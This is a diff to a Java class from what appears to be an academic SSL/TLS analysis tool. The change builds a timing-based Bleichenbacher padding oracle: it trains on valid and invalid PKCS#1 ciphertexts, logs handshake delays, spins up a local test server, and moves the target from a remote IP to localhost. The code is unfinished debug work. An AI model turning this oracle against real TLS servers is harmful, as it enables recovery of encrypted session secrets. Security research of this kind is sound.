@@ -5,26 +5,22 @@
 package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;
 
 import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
-import de.rub.nds.ssl.analyzer.attacker.BleichenbacherCrypto12;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
+import de.rub.nds.ssl.analyzer.removeMe.SSLServer;
 import java.io.FileInputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.net.SocketException;
-import java.security.InvalidKeyException;
-import java.security.KeyStore;
-import java.security.KeyStoreException;
-import java.security.NoSuchAlgorithmException;
-import java.security.PrivateKey;
-import java.security.PublicKey;
-import java.security.Security;
-import java.security.UnrecoverableKeyException;
+import java.security.*;
 import java.security.cert.CertificateException;
+import java.util.logging.Level;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import org.apache.log4j.Logger;
 import org.apache.log4j.PropertyConfigurator;
+import org.apache.log4j.lf5.LogLevel;
 import org.bouncycastle.jce.provider.BouncyCastleProvider;
 
 /**
@@ -33,11 +29,11 @@ import org.bouncycastle.jce.provider.BouncyCastleProvider;
  * @version 0.1
  */
 public class TimingOracle extends ATimingOracle {
+
     /**
      * Log4j logger initialization.
      */
     private static Logger logger = Logger.getRootLogger();
-    
     /**
      * Plain PKCS message
      */
@@ -97,6 +93,35 @@ public class TimingOracle extends ATimingOracle {
     private PrivateKey privateKey;
     private PublicKey publicKey;
     private Cipher cipher;
+    private SSLServer sslServer;
+    /**
+     * Server key store.
+     */
+    private static final String PATH_TO_JKS = "server.jks";
+    /**
+     * Pass word for server key store.
+     */
+    private static final String JKS_PASSWORD = "password";
+    /**
+     * Test Server Thread.
+     */
+    private Thread sslServerThread;
+    /**
+     * Test host.
+     */
+    private static final String HOST = "localhost";
+    /**
+     * Test port.
+     */
+    private static final int PORT = 10443;
+    /**
+     * Detailed Info print out.
+     */
+    private static final boolean PRINT_INFO = false;
+    /**
+     * Protocol short name.
+     */
+    private String protocolShortName = "TLS";
 
     /**
      * Constructor
@@ -118,33 +143,40 @@ public class TimingOracle extends ATimingOracle {
     }
 
     @Override
-    public void trainOracle(byte[] firstRequest, byte[] secondRequest)
+    public void trainOracle(byte[] validRequest, byte[] invalidRequest)
             throws OracleException {
+        FileWriter fw = null;
+        try {
+            fw = new FileWriter("training_data.csv");
+            long delay;
+            // train the oracle using the executeWorkflow functionality
+            for (int i = 0; i < 1; i++) {
+                System.out.println("VAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALID");
+                exectuteWorkflow(validRequest);
+                delay = getTimeDelay(getWorkflow().getTraceList());
+                fw.write(i + ";" + delay);
 
-        long delay;
-
-        // train the oracle using the executeWorkflow functionality
-
-        for (int i = 0; i < 10; i++) {
-            exectuteWorkflow(firstRequest);
-            delay = getTimeDelay(getWorkflow().getTraceList());
-            System.out.println("delay 1: " + delay);
-
-            exectuteWorkflow(secondRequest);
-            delay = getTimeDelay(getWorkflow().getTraceList());
-            System.out.println("delay 2: " + delay);
+                System.out.println("IIIIIIIIIIIIIIIIIIIIIIIIIIIINVALID");
+                exectuteWorkflow(invalidRequest);
+                delay = getTimeDelay(getWorkflow().getTraceList());
+                fw.write(";" + delay + "\n");
+            }
+        } catch (IOException ex) {
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+        } finally {
+            try {
+                fw.close();
+            } catch (IOException ex) {
+                java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            }
         }
-
-
-        throw new UnsupportedOperationException("Not supported yet.");
     }
 
     private static KeyStore loadKeyStore(final String keyStorePath,
             final String keyStorePassword) throws KeyStoreException, IOException,
             NoSuchAlgorithmException, CertificateException {
         KeyStore ks = KeyStore.getInstance("JKS");
-        ks.load(new FileInputStream(keyStorePath), keyStorePassword.
-                toCharArray());
+        ks.load(new FileInputStream(keyStorePath), keyStorePassword.toCharArray());
 
         return ks;
     }
@@ -171,49 +203,75 @@ public class TimingOracle extends ATimingOracle {
         return result;
     }
 
-    private boolean cheat(final byte[] msg) {
+    private boolean cheat(final byte[] msg) throws IllegalBlockSizeException, BadPaddingException {
         boolean result = false;
-        try {
-            byte[] plainMessage = cipher.doFinal(msg);;
 
-            StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
-                    oracleType, cipher.getBlockSize());
-            result = plainOracle.checkDecryptedBytes(plainMessage);
-        } catch (IllegalBlockSizeException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (BadPaddingException ex) {
-            logger.error(ex.getMessage(), ex);
-        }
+        byte[] plainMessage = cipher.doFinal(msg);;
+
+        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
+                oracleType, cipher.getBlockSize());
+        result = plainOracle.checkDecryptedBytes(plainMessage);
 
         return result;
     }
 
     @Override
     public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
-//        exectuteWorkflow(encPMS);
+        boolean ret = false;
+        try {
+            exectuteWorkflow(encPMS);
+            long delay = getTimeDelay(getWorkflow().getTraceList());
+            System.out.println("XXXXXXX Delay: " + delay);
 
-//        long delay = getTimeDelay(getWorkflow().getTraceList());
-        
-// TODO: remove when workflow is executed        
-numberOfQueries++;
-        return cheat(encPMS);
+    // TODO: remove when workflow is executed        
+    // numberOfQueries++;
+            //ret = cheat(encPMS);
+        } catch (Exception ex) {
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            sslServer.shutdown();
+            sslServerThread.interrupt();
+            throw new OracleException("SSL", ex, LogLevel.FATAL);
+        }
+        return ret;
+    }
+
+    public void setUp() {
+        try {
+            System.setProperty("javax.net.debug", "ssl");
+            sslServer = new SSLServer(PATH_TO_JKS, JKS_PASSWORD,
+                    protocolShortName, PORT, PRINT_INFO);
+            sslServerThread = new Thread(sslServer);
+            sslServerThread.start();
+            Thread.currentThread().sleep(2000);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     public static void main(String[] args) {
         PropertyConfigurator.configure("logging.properties");
-        
+
         try {
             String keyName = "2048_rsa";
             String keyPassword = "password";
             KeyStore ks = loadKeyStore("server.jks", "password");
             PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
-            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
-                    toCharArray());
+            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.toCharArray());
 
-            TimingOracle to = new TimingOracle("134.147.198.93", 51419,
+            TimingOracle to = new TimingOracle("127.0.0.1", PORT,
                     privateKey, OracleType.TTT);
+            // TODO: Start SSL-Server for testing purposes
+            to.setUp();
 
+            byte[] plainPKCS_wrong = new byte[plainPKCS.length];
+            System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
+            plainPKCS_wrong[0] = 23;
+            
             byte[] encPMS = encryptHelper(plainPKCS, publicKey);
+            byte[] encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
+            
+            to.trainOracle(encPMS, encPMSWrong);
+            System.exit(0);
 
             Bleichenbacher attacker = new Bleichenbacher(encPMS,
                     to, true);
